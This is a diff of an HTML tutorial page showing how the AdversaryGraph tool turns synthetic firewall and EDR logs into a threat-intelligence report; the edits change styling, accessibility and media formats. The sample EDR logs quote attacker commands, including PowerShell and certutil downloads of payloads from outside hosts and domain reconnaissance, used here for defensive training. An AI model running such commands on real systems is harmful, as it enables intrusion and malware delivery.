@@ -85,6 +85,22 @@
       .button.primary { background: #f43f5e; border-color: #f43f5e; color: #fff; }
       footer { border-top: 1px solid rgba(147,197,253,0.22); background: rgba(5,12,26,0.96); padding: 24px 0; color: #8fa8cc; }
       @media (max-width: 900px) { main { grid-template-columns: 1fr; } aside { position: static; } .nav { align-items: flex-start; flex-direction: column; padding: 14px 0; } }
+      /* Historical article with a dark-first palette; light is the site default. */
+      html[data-theme="light"] { --bg: #f5f5f4; --text: #242326; --muted: #626064; --line: #d8d3d4; --chip: #f3e7e9; --panel-muted: #454145; }
+      html[data-theme="light"] body::before { display: none; }
+      html[data-theme="light"] :is(.article-hero, .hero) { background: #efeded; }
+      html[data-theme="light"] :is(article, .side-card) { background: #fbfbfa; border-color: #d8d3d4; }
+      html[data-theme="light"] :is(h1, h2, h3, th, .brand) { color: #242326; }
+      html[data-theme="light"] :is(.lead, td, blockquote, figcaption) { color: #454145; }
+      html[data-theme="light"] :is(.eyebrow, .toc) { color: #68111e; }
+      html[data-theme="light"] a:not(.button) { color: #8d1828; }
+      html[data-theme="light"] .chip { color: #68111e; background: #f3e7e9; border-color: #d8d3d4; }
+      html[data-theme="light"] :is(.callout, blockquote) { background: #eef3fb; border-color: #9db4d5; }
+      html[data-theme="light"] .button:not(.primary) { background: #fbfbfa; color: #242326; border-color: #d8d3d4; }
+      html[data-theme="light"] .button.primary { background: #8d1828; border-color: #8d1828; color: #fff; }
+      html[data-theme="light"] footer { background: #efeded; color: #626064; }
+      /* Links inside prose are underlined, not distinguished by color alone. */
+      :is(.lead, article p, article li) a:not(.button) { text-decoration: underline; text-underline-offset: 2px; }
     </style>
       <script src="/assets/site-performance.js" data-google-analytics-id="G-TMTG21RVHM" defer></script>
     <script src="/assets/site-theme.js?v=20260904-light-default" defer></script>
@@ -284,7 +300,7 @@
     </header>
     <!-- site-shell:header:end -->
 
-    <section class="hero">
+    <section class="hero" aria-labelledby="from-log-to-report-using-adversarygraph-to-turn-firewall-and-edr-noise-into-a-cti-investigation">
       <div class="hero-inner">
         <p class="eyebrow">AdversaryGraph v3.1 workflow</p>
         <h1 id="from-log-to-report-using-adversarygraph-to-turn-firewall-and-edr-noise-into-a-cti-investigation">From Log to Report: Using AdversaryGraph to Turn Firewall and EDR Noise Into a CTI Investigation</h1>
@@ -341,7 +357,7 @@
         <p>
           The firewall sample simulates repeated outbound connections from one workstation to suspicious IPs and domains.
         </p>
-        <pre><code>2026-06-20T08:14:11Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=103.119.47.104 dst_port=443 sni=power-sync-services.com
+        <pre tabindex="0"><code>2026-06-20T08:14:11Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=103.119.47.104 dst_port=443 sni=power-sync-services.com
 2026-06-20T08:17:44Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=38.60.245.37 dst_port=443 sni=gatewayrvcenter.com
 2026-06-20T08:24:31Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=38.60.245.37 dst_port=80 url=http://metakit.fireant.vn/Software/version.xml
 2026-06-20T08:24:35Z FW01 ALLOW src=10.44.18.23 src_host=FIN-WS-042 dst=38.60.245.37 dst_port=80 url=http://metakit.fireant.vn/Software/setup.exe
@@ -351,7 +367,7 @@
         </p>
 
         <h2 id="edr">Synthetic EDR Logs</h2>
-        <pre><code>2026-06-20T08:24:38Z EDR process_start parent=WINWORD.EXE process=powershell.exe cmd="Invoke-WebRequest -Uri http://metakit.fireant.vn/Software/setup.exe -OutFile C:\ProgramData\Microsoft\setup.exe"
+        <pre tabindex="0"><code>2026-06-20T08:24:38Z EDR process_start parent=WINWORD.EXE process=powershell.exe cmd="Invoke-WebRequest -Uri http://metakit.fireant.vn/Software/setup.exe -OutFile C:\ProgramData\Microsoft\setup.exe"
 2026-06-20T08:24:51Z EDR file_create path=C:\ProgramData\Microsoft\setup.exe sha256=eb52d1791fc861e459ee14f15ef8d4819a4afde3ac7ce5e8cebdcd5f7840925f signer=unsigned
 2026-06-20T08:25:31Z EDR process_start parent=setup.exe process=cmd.exe cmd="cmd.exe /c whoami /all && hostname && ipconfig /all"
 2026-06-20T08:26:12Z EDR process_start parent=setup.exe process=nltest.exe cmd="nltest.exe /dclist:corp.local"
@@ -360,7 +376,7 @@
 2026-06-20T08:36:12Z EDR process_start parent=rundll32.exe process=certutil.exe cmd="certutil.exe -urlcache -split -f http://gatewayrvcenter.com/payload.dat C:\ProgramData\Microsoft\cache.bin"</code></pre>
 
         <h2 id="full-flow">Full Flow Presentation</h2>
-        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/04-full-flow-presentation.gif" alt="Animated From Log to Report workflow in AdversaryGraph" width="1920" height="1033" loading="lazy" decoding="async" />
+        <video class="article-img" style="height:auto" controls muted loop playsinline preload="none" width="1920" height="1033" poster="../assets/adversarygraph/from-log-to-report/04-full-flow-presentation-poster.png" aria-label="Animated From Log to Report workflow in AdversaryGraph"><source src="../assets/adversarygraph/from-log-to-report/04-full-flow-presentation.mp4" type="video/mp4"><a href="../assets/adversarygraph/from-log-to-report/04-full-flow-presentation.gif">Animated From Log to Report workflow in AdversaryGraph</a></video>
 
         <h2 id="create-investigation">Step 1: Create A New Investigation</h2>
         <img class="article-img" src="../assets/adversarygraph/from-log-to-report/05-create-new-investigation.png" alt="Create a new investigation workspace" width="1024" height="510" loading="lazy" decoding="async" />
@@ -369,7 +385,7 @@
         </p>
 
         <h2 id="firewall-analysis">Step 2: Analyze Firewall Logs</h2>
-        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/06-analyze-firewall-logs.gif" alt="Animated firewall log analysis in Log / PCAP mode" width="1919" height="1015" loading="lazy" decoding="async" />
+        <video class="article-img" style="height:auto" controls muted loop playsinline preload="none" width="1919" height="1015" poster="../assets/adversarygraph/from-log-to-report/06-analyze-firewall-logs-poster.png" aria-label="Animated firewall log analysis in Log / PCAP mode"><source src="../assets/adversarygraph/from-log-to-report/06-analyze-firewall-logs.mp4" type="video/mp4"><a href="../assets/adversarygraph/from-log-to-report/06-analyze-firewall-logs.gif">Animated firewall log analysis in Log / PCAP mode</a></video>
         <p>
           Open <strong>AI Analysis</strong>, select <strong>Log / PCAP</strong>, and paste or upload only the firewall logs first. Do not write a manual prompt. The Log / PCAP mode already uses an internal AdversaryGraph system prompt to extract IOCs, identify suspicious activity, map behavior to ATT&amp;CK, separate source evidence from enrichment leads, avoid attribution claims, and return a structured analyst result.
         </p>
@@ -380,7 +396,7 @@
         </p>
 
         <h2 id="edr-analysis">Step 4: Analyze EDR Logs</h2>
-        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/07-analyze-edr-logs.gif" alt="Animated EDR log analysis in Log / PCAP mode" width="1919" height="1015" loading="lazy" decoding="async" />
+        <video class="article-img" style="height:auto" controls muted loop playsinline preload="none" width="1919" height="1015" poster="../assets/adversarygraph/from-log-to-report/07-analyze-edr-logs-poster.png" aria-label="Animated EDR log analysis in Log / PCAP mode"><source src="../assets/adversarygraph/from-log-to-report/07-analyze-edr-logs.mp4" type="video/mp4"><a href="../assets/adversarygraph/from-log-to-report/07-analyze-edr-logs.gif">Animated EDR log analysis in Log / PCAP mode</a></video>
         <p>
           Return to <strong>AI Analysis -> Log / PCAP</strong> and paste or upload the EDR logs as a separate analysis. Do not combine firewall and EDR logs in one run unless you intentionally want one mixed result. The cleaner workflow is one source per run.
         </p>
@@ -393,7 +409,7 @@
         <h2 id="extraction">Step 6: Extract IOCs And Suspicious Activity</h2>
         <img class="article-img narrow" src="../assets/adversarygraph/from-log-to-report/08-extracted-iocs-firewall.png" alt="Extracted firewall IOCs" width="830" height="287" loading="lazy" decoding="async" />
         <img class="article-img narrow" src="../assets/adversarygraph/from-log-to-report/09-extracted-iocs-edr.png" alt="Extracted EDR IOCs" width="694" height="692" loading="lazy" decoding="async" />
-        <table>
+        <table tabindex="0">
           <thead><tr><th>Type</th><th>Examples</th></tr></thead>
           <tbody>
             <tr><td>IPs</td><td>103.119.47.104, 38.60.245.37, 166.88.77.186</td></tr>
@@ -404,7 +420,7 @@
         </table>
         <img class="article-img narrow" src="../assets/adversarygraph/from-log-to-report/10-suspicious-behaviors.png" alt="Suspicious behaviors table with source evidence" width="871" height="692" loading="lazy" decoding="async" />
         <img class="article-img narrow" src="../assets/adversarygraph/from-log-to-report/11-attack-technique-leads.png" alt="ATT&CK technique leads extracted from log evidence" width="861" height="472" loading="lazy" decoding="async" />
-        <table>
+        <table tabindex="0">
           <thead><tr><th>Technique lead</th><th>Why</th></tr></thead>
           <tbody>
             <tr><td>T1059 / T1059.001</td><td>PowerShell and command execution.</td></tr>
@@ -459,7 +475,7 @@
 
         <h2 id="report">Step 13: Generate The Report</h2>
         <img class="article-img" src="../assets/adversarygraph/from-log-to-report/20-final-report-preview.png" alt="Final investigation report preview" width="1024" height="551" loading="lazy" decoding="async" />
-        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/21-report-generation-workflow.gif" alt="Animated report generation workflow from investigation evidence" width="1920" height="1033" loading="lazy" decoding="async" />
+        <video class="article-img" style="height:auto" controls muted loop playsinline preload="none" width="1920" height="1033" poster="../assets/adversarygraph/from-log-to-report/04-full-flow-presentation-poster.png" aria-label="Animated report generation workflow from investigation evidence"><source src="../assets/adversarygraph/from-log-to-report/04-full-flow-presentation.mp4" type="video/mp4"><a href="../assets/adversarygraph/from-log-to-report/21-report-generation-workflow.gif">Animated report generation workflow from investigation evidence</a></video>
         <p>
           After evidence review, generate the report from the active Investigation workspace. A strong output includes the original log findings, IOC type, suspiciousness rationale, source evidence, TTP leads, actor-lead caveats, kill-chain interpretation, recommended pivots, and defensive actions.
         </p>
